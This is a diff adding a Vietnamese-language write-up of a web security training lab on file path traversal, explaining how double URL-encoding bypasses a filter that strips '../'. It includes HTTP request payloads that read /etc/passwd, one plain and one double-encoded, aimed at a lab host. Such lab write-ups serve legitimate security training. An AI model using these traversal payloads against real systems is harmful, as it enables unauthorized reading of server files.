@@ -97,6 +97,26 @@ Sau khi chương trình đã loại bỏ `../` hoặc `..\` thì mọi thứ đ�
 - Thay đổi đường dẫn hình ảnh sử dụng các payload trên.
 - Truy cập **HTTP history** để xem nội dung
 
+### Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
+#### Analysis
+- Để giải quyết lab này, cần phải **encode url** 2 lần
+- Mốt số trường hợp webserver decode 1 lần và kiểm tra `../` có tồn tại không để thực hiện logic khác
+- Sau khi decode 1 lần, request được gửi đến **Backend** để xử lý, và **Path traversal** xảy ra
+#### Exploit
+- Gửi request đến **Repeater**, thay đổi đường dẫn
+```http
+GET /image?filename=../../../etc/passwd HTTP/2
+Host: 0a24006d03b4e0b48025dad200d800f9.web-security-academy.net
+```
+
+- Bôi đen `../../../`, tại tab **Inspector**, phần **Decoded from** chon ký hiệu `+`
+- Ở phần **Decoded from** vửa được tạo, click **select**, chọn **URL encoding**
+- Tại đó, nhập lại `../../../`
+- Copy nội dung phần **Selected text** và dán vào request
+```http
+GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
+Host: 0a24006d03b4e0b48025dad200d800f9.web-security-academy.net
+```
 
 ---
 Goodluck! 🍀🍀🍀
